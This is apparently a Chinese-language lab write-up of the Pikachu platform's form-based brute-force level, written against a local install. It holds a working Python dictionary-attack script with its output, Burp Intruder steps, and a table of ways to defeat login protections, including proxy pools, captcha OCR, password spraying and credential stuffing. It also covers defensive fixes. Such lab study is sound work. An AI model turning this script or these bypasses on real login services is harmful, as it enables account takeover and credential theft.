---
layout: post
title: Pikachu - 暴力破解 基于表单的暴力破解 Writeup
platform: pikachu
date: 2026-10-24 22:41:00 +0800
categories: CTF
---

Pikachu - 暴力破解 基于表单的暴力破解 Writeup

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：暴力破解 → 基于表单的暴力破解
- 地址：`http://localhost/pikachu/vul/burteforce/bf_form.php`
- 题型：Web
- 考点：**无防护登录 → 字典攻击**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
数据库 pikachu / root / root
```

**✅ 实测结果**

```text
用 145 条常见密码字典跑三个账号：

    admin   →  第 1 次命中   →  123456    耗时 0.1 秒
    test    →  第 13 次命中  →  abc123    耗时 0.5 秒
    pikachu →  第 31 次命中  →  000000    耗时 1.1 秒

★ 145 条字典，全部跑完最慢也就 1 秒多
★ 换成 1000 万条字典，也只需要几小时（如果服务端不设防）
```

二、题目分析

**① 正常功能长什么样**

页面上是一个普通的登录表单：

```html
<form method="post" action="bf_form.php">
    <input type="text"     name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <input type="submit"   name="submit"   value="Login" />
</form>
```

输入 `admin` / `123456` → 显示 `login success`
输入错误密码 → 显示 `username or password is not exists～`

**② 后端代码（关键）**

```php
<?php
//典型的问题,没有验证码,没有其他控制措施,可以暴力破解
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);
    $line_pre->bind_param('ss',$username,$password);

    if($line_pre->execute()){
        $line_pre->store_result();
        if($line_pre->num_rows>0){
            $html.= '<p> login success</p>';           // 成功
        } else{
            $html.= '<p> username or password is not exists～</p>';  // 失败
        }
    }
}
?>
```

**★ 注意第 2 行的注释 —— 作者自己写了"可以暴力破解"**：

```php
//典型的问题,没有验证码,没有其他控制措施,可以暴力破解
```

**③ 漏洞点：缺了三道防线**

| 防护手段 | 本关有没有 | 缺了会怎样 |
|---|---|---|
| **验证码** | ❌ 没有 | 脚本可以无限次提交 |
| **失败次数限制** | ❌ 没有 | 试错成本 = 0 |
| **请求延时/限流** | ❌ 没有 | 每秒能试几十次 |

**★ 对比一下"正常网站"的登录**：

```text
第 1 次错 → "密码错误"
第 2 次错 → "密码错误"
第 3 次错 → 出现图形验证码
第 4 次错 → "账号已锁定，15 分钟后再试"
第 5 次错 → 发送邮件告警给用户

★ 这三道防线只要有一道，脚本就跑不动了
```

**④ 本题还顺带证明了：SQL 注入不是唯一问题**

```php
$sql = "select * from users where username=? and password=md5(?)";
$line_pre = $link->prepare($sql);        // ← 用了预处理
$line_pre->bind_param('ss',$username,$password);   // ← 参数绑定
```

**★ 这段代码【防住了 SQL 注入】**，但**没防暴力破解**。

**说明**：
```
SQL 注入 → 用"预处理"能防
暴力破解 → 必须用"流程控制"（验证码/限流/锁定）防

★ 两类漏洞，两种防法，不能混为一谈
```

三、解题步骤

**第 1 步：用 F12 抓一次正常登录，看清请求结构**

```
① 打开 http://localhost/pikachu/vul/burteforce/bf_form.php
② 按 F12 → 点【网络】(Network)
③ 勾选 【保留日志】 ← 重要！否则提交后记录会被清空
④ 用户名 admin，密码 123456，点 Login
⑤ 在列表里找到那条 bf_form.php
   （建议：右键表头 → 勾选【方法】，让列表显示 GET/POST）
```

**点开那条 POST 请求**：

```
【标头】标签：
    请求方法: POST
    请求 URL: .../bf_form.php

【负载】标签：
    username:  admin
    password:  123456
    submit:    Login
```

**★ 这一步是所有 Web 渗透的第一步：找到请求、看清参数。**

**第 2 步：确认"怎么判断成功"**

```
错误：username or password is not exists～
成功：login success
```

**★ 有一个明确可判定的特征，才能自动化。**

**★ 顺带发现一个细节**：

```
成功响应 34283 字节
失败响应 34305 字节

为什么成功反而更短？
    "login success"（13 字符）比
    "username or password is not exists～"（35 字符）短
```

**第 3 步：准备字典**

```text
文件：C:\Users\cecilia\Downloads\passwords-top150.txt
内容：145 条常见密码（按常见程度排序）

前 10 条：
    123456, password, 12345678, qwerty, 123456789,
    12345, 1234, 111111, 1234567, dragon
```

**★ 字典顺序很重要** —— 最常见的排最前面。

**第 4 步：用脚本爆破**

```python
import time
import urllib.parse
import urllib.request

URL = "http://localhost/pikachu/vul/burteforce/bf_form.php"
USERNAME = "test"
DICT_FILE = r"C:\Users\cecilia\Downloads\passwords-top150.txt"
SUCCESS_KEYWORD = "login success"


def try_password(password):
    data = urllib.parse.urlencode({
        "username": USERNAME,
        "password": password,
        "submit": "Login",
    }).encode()
    req = urllib.request.Request(URL, data=data, method="POST",
                                 headers={"User-Agent": "Mozilla/5.0",
                                          "Content-Type": "application/x-www-form-urlencoded"})
    with urllib.request.urlopen(req, timeout=15) as resp:
        return SUCCESS_KEYWORD in resp.read().decode("utf-8", "replace")


with open(DICT_FILE, encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

start = time.time()
for i, pw in enumerate(passwords, 1):
    if try_password(pw):
        print("[%d/%d] %s ★★★ 成功" % (i, len(passwords), pw))
        print("密码: %s  耗时: %.1f 秒" % (pw, time.time() - start))
        break
    print("[%d/%d] %s 失败" % (i, len(passwords), pw))
```

**实测输出**：

```text
==============================================================
  目标用户: test
  字典:     C:\Users\cecilia\Downloads\passwords-top150.txt (145 个)
==============================================================
[  1/145]  123456                   失败
[  2/145]  password                 失败
[  3/145]  12345678                 失败
[  4/145]  qwerty                   失败
[  5/145]  123456789                失败
[  6/145]  12345                    失败
[  7/145]  1234                     失败
[  8/145]  111111                   失败
[  9/145]  1234567                  失败
[ 10/145]  dragon                   失败
[ 11/145]  123123                   失败
[ 12/145]  baseball                 失败
[ 13/145]  abc123                   ★★★ 成功
==============================================================
✅ 爆破成功
   用户名: test
   密  码: abc123
   尝试: 13 / 145 次
   耗时: 0.5 秒
==============================================================
```

**第 5 步：用 Burp Intruder 做一遍（正统工具）**

**同样的事情，Burp 也能做，步骤更多但更"可视化"**：

```
① 启动 Burp：java -jar burpsuite_community.jar
② Proxy → Intercept → Open browser（用 Burp 内置浏览器）
   ★ 关键：Chrome 默认不走代理访问 localhost，抓不到包
            Burp 内置浏览器全量走代理
③ 打开靶场页面，填任意账号密码，Intercept on，点 Login
④ 抓到 POST 请求后 → 右键 → Send to Intruder (Ctrl+I)
⑤ Intruder → Positions
   - 点【Clear §】清掉自动标记
   - 选中密码值，点【Add §】，只标一处
⑥ Intruder → Payloads
   - Payload type: Simple list
   - Load... → 选 passwords-top150.txt
⑦ Intruder → Settings → Grep - Match
   - 添加匹配字符串：login success
   ★ 不加这个，你要一条条点开 145 个响应看
⑧ 点【Start attack】
   - 结果表里，密码正确的那行 Grep 列会打勾
```

**Burp Community 版有个坑**：

```
Intruder 被限速到【约 1 请求/秒】

145 个密码  →  约 2.5 分钟
10000 个密码 →  约 2.8 小时（基本不可用）

★ 对比脚本：145 个密码 0.5 秒
★ 所以：学习用 Burp，实战批量用脚本
```

**第 6 步：三个账号全跑一遍，对比**

| 用户名 | 密码 | 字典命中位置 | 耗时 |
|---|---|---|---|
| admin | 123456 | 第 1 位 | 0.1 秒 |
| test | abc123 | 第 13 位 | 0.5 秒 |
| pikachu | 000000 | 第 31 位 | 1.1 秒 |

**★ 结论**：

```
密码越"常见"，越靠字典前面，破得越快

123456     → 全世界最常用，第 1 位
abc123     → 键盘顺序 + 递增数字，第 13 位
000000     → 纯数字重复，第 31 位
```

**第 7 步：试一个"爆不出来"的情况**

```powershell
python brute_user.py nobody
```

**输出**：

```text
[145/145]  ...
❌ 字典跑完没找到
   → 密码不在这个字典里
   尝试: 145 / 145 次
```

**★ 这就是字典攻击的局限**：

```
"000000"       → 字典里有，0.5 秒破
"Xk9#mP2$vL7"  → 字典里没有，穷举要几万年
```

四、延伸知识

**① 暴力破解的三个变量**

```text
① 字典质量（猜得准不准）
    rockyou.txt（1400 万条）比 top150 强太多
    中文环境还有"姓名拼音 + 生日"字典

② 请求速度（试得快不快）
    单线程 ~30 次/秒
    多线程 ~几百次/秒
    分布式（多 IP）~ 上万次/秒

③ 服务端的防护（能不能试）
    有验证码 → 需要 OCR，成本高
    有锁定 → 不能一直试
    有延时 → 速度被限制
```

**★ 攻击者能控制的只有 ①②，防御的核心是 ③。**

**② 常见"防暴力破解"手段及绕过**

| 防护 | 强度 | 可能的绕过 |
|---|---|---|
| 无防护 | 0 | 直接跑脚本 |
| 前端验证码（JS 检查）| 0 | 禁用 JS / 直接发请求 |
| 验证码不刷新 | 弱 | 抓一次验证码，重复用 |
| 图形验证码 | 中 | OCR / 打码平台 / 深度学习 |
| 失败次数限制（按账号）| 中 | 换账号（撞库）、密码喷洒 |
| IP 限流 | 中 | 换代理池、分布式 |
| 失败延时（sleep）| 中 | 多线程并发（延时对并发无效）|
| 账号锁定 | 中强 | 拒绝服务副作用（把别人锁死）|
| 两步验证 | 强 | 基本无解 |
| 行为分析 + 风控 | 强 | 需要模拟真人 |

**★ "密码喷洒"（Password Spraying）**：

```
不打一个账号的 N 个密码
而是打 N 个账号的 1 个常见密码（比如 123456）

★ 好处：不会触发"单账号失败次数"限制
★ 这是攻击企业 AD 域最常用的手法
```

**③ 撞库（Credential Stuffing）**

```text
泄漏的数据库 → 拿到"邮箱 + 密码"对
→ 去其他网站批量试

★ 因为很多人"一个密码走天下"
★ 这就是为什么"每个网站用不同密码"极其重要

真实案例：
    · 2019 年 Collection #1（7.7 亿条）
    · 2021 年 RockYou2021（84 亿条）
```

**④ 正确防护（开发者视角）**

```php
// ① 记录失败次数
if (登录失败) {
    $_SESSION['fail_count']++;

    // ② 失败 5 次锁定
    if ($_SESSION['fail_count'] >= 5) {
        die("失败次数过多，请 15 分钟后再试");
    }

    // ③ 每次失败延时（拖慢攻击者）
    sleep(1);
}
```

**再加上**：

```text
④ 失败 3 次后出现图形验证码
⑤ 记录 IP + 时间 + UA，异常时告警
⑥ 强制强密码（8 位以上、三种字符）
⑦ 两步验证（重要系统必开）
⑧ 检测"密码喷洒"（同一 IP 试多个账号）
⑨ 密码错误提示统一（"用户名或密码错误"），不泄露"用户是否存在"
```

**★ 本关的提示 `username or password is not exists～` 其实是另一个小问题**：

```
它同时告诉你"用户名是否存在"

安全做法：统一回复"用户名或密码错误"
```

五、总结

- **本题核心：登录接口没有验证码、没有次数限制、没有延时 → 可无限次尝试 → 字典攻击。**

- 三步方法论：

```text
① F12 抓包，看清请求（方法、URL、参数）
② 找到"成功 / 失败"的判定特征（login success）
③ 循环提交 + 判断特征 = 暴力破解
```

- **三个必记要点**：

```text
① 暴力破解不是"猜"，是"把重复劳动交给机器"
② 判断成功的特征必须明确、可自动化（这题是 "login success"）
③ 字典顺序很重要 —— 最常见的密码排在字典最前面
```

- **实测结果**：

```text
admin   / 123456  （第 1 位，0.1 秒）
test    / abc123  （第 13 位，0.5 秒）
pikachu / 000000  （第 31 位，1.1 秒）
```

- **工具对比**：

| 工具 | 速度（145 条）| 适用场景 |
|---|---|---|
| Python 脚本 | 0.5 秒 | 批量、自动化 |
| Burp Intruder（Community）| 约 145 秒 | 学习、探索、复杂请求 |
| Burp Repeater | 单次 | 改包试探（比赛最常用）|


**手工复现要点**：

```text
· F12 → 网络 → 勾【保留日志】→ 抓 POST
· 确认参数：username / password / submit
· 确认判定：响应里有 "login success" 就是成功
· 写循环或用 Burp Intruder 跑字典
· 看到 ★★★ 成功 就通关了
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  暴力破解 = 字典 + 循环 + 判定特征                       │
│                                                        │
│  能打的三个前提（缺一不可）：                             │
│      ① 没有验证码                                       │
│      ② 没有次数限制                                     │
│      ③ 没有延时/限流                                    │
│                                                        │
│  ★ 补上任意一条，脚本的效率就会下降一个数量级             │
└────────────────────────────────────────────────────────┘
```
